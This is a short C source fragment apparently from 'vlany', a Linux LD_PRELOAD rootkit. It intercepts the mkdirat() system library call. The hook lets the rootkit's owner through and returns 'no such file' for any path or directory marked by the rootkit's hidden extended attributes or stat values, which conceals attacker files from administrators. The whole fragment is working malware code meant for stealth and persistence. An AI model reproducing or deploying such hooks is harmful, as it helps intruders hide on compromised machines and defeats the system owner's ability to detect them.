int mkdirat(int dirfd, const char *pathname, mode_t mode)
{
    #ifdef DEBUG
        printf("[vlany] mkdirat() called\n");
    #endif

    HOOK(old_mkdirat, CMKDIRAT);

    if(owned()) return old_mkdirat(dirfd, pathname, mode);

    if(hidden_xattr(pathname) || hidden_fxattr(dirfd) || hidden_xstat(_STAT_VER, pathname, 32) || hidden_fxstat(_STAT_VER, dirfd, 32)) { errno = ENOENT; return -1; }

    return old_mkdirat(dirfd, pathname, mode);
}
